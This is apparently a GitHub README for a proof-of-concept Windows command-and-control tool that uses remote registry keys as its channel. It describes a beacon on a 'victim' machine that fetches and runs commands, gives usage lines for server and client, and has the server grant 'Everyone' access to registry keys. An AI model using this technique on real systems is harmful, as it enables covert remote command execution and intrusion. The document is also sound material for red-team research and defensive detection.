# Everything Can Be A Shell... An asynchronous shell at least...


## Disclaimer
The shells in this repository are all Proof-of-Concept and have only been tested in my own lab. Enjoy :)
*... Also, at this moment, the repository only contains a single shell using Windows Registry keys. However, I hope to add more in the future. *

## Concept of this repository
This repository is made to explore untraditional ways of establishing command and control (C2) on Microsoft Windows systems. The shells in this repository are asynchronous just like Cobalt Strikes shells. The client (beacon) will check-in at a given interval (sleep-timer) for any new commands from the server (C2). If a command is found, the beacon will execute it and post the result back to the server. 

## C2 using Windows registry keys

### Brief description: 
This shell is based on Windows Registry keys. Yes, registry keys as in regedit.exe. The idea comes from the fact, that Windows allows for users (with the correct permissions) to read, write and/or delete registry keys and values on remote systems using the WinReg Protocol (MS-RRP). The "protocol" is built on top of the RPC protocol and is described by Microsoft: (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78). Using custom code, it is possible to create a client-server-relationsship by having certain registry keys located on the server that the client can interact with.  

### Demo:
[![Demo](https://img.youtube.com/vi/jOPCbK-WF1M/0.jpg)](https://www.youtube.com/watch?v=jOPCbK-WF1M)

**Requirements:** 
The Remote Registry Service needs to be enabled on the server, and the user trying to read & write to the remote registry needs to have the correct permissions.

**Limitations:** 
Since the traffic is based on RPC, it should only really be suitable for lateral movement on local networks, however I have not tested it over the internet. 

**Security considerations:**
The permissions allows for anyone to connect to the servers registry database. Each registry key is protected by its own SACL, and so the server is only as insecure as the applied permissions on each key. The consequences could be dire :D

### How it works:
1. When the server starts, the Remote Registry Service is enabled and started. 
2. The registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined> is created along with the following registry values: cmd, output & sleep. The user-defined registry key is specific to a single beacon and could be compared to setting up a listener.
3. Read/Write permissions are then set for the user "Everyone" on the newly created registry key.
4. Permissions are likewise set on the key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. This ensures that any client can authenticate to the server. (Note that, on exiting/closing the server, these permissions are removed again.) 
5. When executing the beacon on the victim machine, it will connect to the C2 server using the WinReg protocol, and read the newly created registry key for the value of "sleep", to determine how often to check-in. 
6. When the timer is up, the client checks-in and executes the command found in the "cmd"-value. 
7. The result of the command is written as a string to the "output" value. 
8. While running, the server will look for new updates to the "output" value and prints it back to the attacker.
9. The attacker can now run a new command if he/she wants to.

### Usage:
**Setup the server on the attackers machine (listener/C2):**
``` 
RegC2Server.exe <Registry key name to use with the client>
Example: RegC2Server.exe victim01
```
**Starting the client on the victim (beacon):**
```
RegC2Client.exe <host> <Registry key name used to start the server>
Example: RegC2Client.exe ws01 victim01
```

**Since this is a PoC, only the following commands have been implemented:**
```
>help
sleep <int>      Set the sleep time to the value of int
cmd <command>    cmd to execute
exit             Exit the application gracefully
```


### Screenshots:

**Starting the C2 server:**
Here, the server is started with the argument "victim01". The Remote Registry Service is attempted to be started, and the necessary permissions are put in place. The Registry key HKLM\Software\RegistryC2\victim01 is created with its necessary values: cmd, output & sleep. 
![server_start](https://user-images.githubusercontent.com/35890107/186360543-a9bf7634-ea0d-4a0c-a9e5-4956701e0af3.png)

![server_registry](https://user-images.githubusercontent.com/35890107/186360608-0ac3a430-912b-4a19-824d-3cfdedb5201b.png)

![server_cmd1](https://user-images.githubusercontent.com/35890107/186360638-91884a40-eaa8-4169-a148-95d14b26b894.png)

![server_cmd2](https://user-images.githubusercontent.com/35890107/186360670-a328752d-8221-4811-8ae1-0453c211ff03.png)

![client_start](https://user-images.githubusercontent.com/35890107/186356461-715947b2-5926-40fe-9d9f-2264ebe20476.png)

![server_exit](https://user-images.githubusercontent.com/35890107/186360706-dce99907-6027-4bad-abc4-ade26429fe41.png)


